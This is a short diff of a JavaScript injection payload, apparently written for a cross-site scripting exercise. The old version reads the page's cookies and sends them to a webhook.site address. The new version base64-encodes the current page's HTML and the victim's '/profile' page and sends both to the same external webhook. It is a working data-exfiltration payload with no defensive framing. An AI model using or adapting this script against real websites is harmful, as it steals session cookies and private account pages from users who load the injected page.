@@ -1,4 +1,12 @@
-var cookies = document.cookie;
+// Send current page
+var current = document.documentElement.outerHTML;
+fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?current=' + 
+      btoa(current));
 
-    // Send to webhook
-fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?secret=' + cookies);
+// Also fetch and send profile page
+fetch("/profile")
+    .then(response => response.text())
+    .then(html => {
+        fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?profile=' + 
+              btoa(html));
+    });
